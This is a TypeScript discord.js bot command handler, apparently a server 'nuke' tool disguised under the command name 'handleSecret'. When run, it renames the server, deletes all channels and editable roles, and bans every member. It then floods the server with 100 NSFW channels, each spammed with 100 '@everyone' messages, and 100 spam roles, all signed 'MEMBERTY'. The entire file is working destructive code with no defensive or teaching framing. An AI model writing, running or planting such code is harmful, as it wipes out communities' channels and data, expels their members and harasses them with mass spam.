import type { Message, Client } from "discord.js";
import { ChannelType } from "discord.js";

export async function handleSecret(
  message: Message,
  args: string[],
  client: Client,
): Promise<void> {
  void args;
  void client;

  const guild = message.guild;
  if (!guild) return;

  let status: import("discord.js").Message | null = null;

  const updateStatus = async (text: string) => {
    try {
      if (status) {
        await status.edit(text);
      } else {
        status = await message.channel.send(text).catch(() => null);
      }
    } catch {
      /* noop */
    }
  };

  await updateStatus("🔥 Firing...");

  // Rename the server
  await guild.setName("KINGMAN").catch(() => {});

  // Fetch all members first so the cache is populated
  await guild.members.fetch().catch(() => {});

  await updateStatus("🔥 Deleting channels...");
  for (const [, channel] of guild.channels.cache) {
    await channel.delete().catch(() => {});
  }

  await updateStatus("🔥 Deleting roles...");
  for (const [, role] of guild.roles.cache) {
    if (role.name === "@everyone" || !role.editable) continue;
    await role.delete().catch(() => {});
  }

  await updateStatus("🔥 Banning members...");
  for (const [, member] of guild.members.cache) {
    if (member.id === client.user?.id) continue;
    await member.ban({ reason: "MEMBERTY FIRE" }).catch(() => {});
  }

  await updateStatus("🔥 Creating spam channels...");
  for (let i = 0; i < 100; i++) {
    const ch = await guild.channels
      .create({
        name: "MEMBERTY",
        type: ChannelType.GuildText,
        nsfw: true,
        topic: "MEMBERTY WAS HERE SAY GOODNIGHT :)",
      })
      .catch(() => null);

    if (ch && ch.isTextBased()) {
      for (let j = 0; j < 100; j++) {
        await ch.send("> @everyone MEMBERTY NUKE SYSTEM").catch(() => {});
      }
    }
  }

  await updateStatus("🔥 Creating spam roles...");
  for (let i = 0; i < 100; i++) {
    await guild.roles
      .create({
        name: "MEMBERTY",
        color: "Red",
      })
      .catch(() => {});
  }

  await updateStatus("✅ Done.").catch(() => {});
}
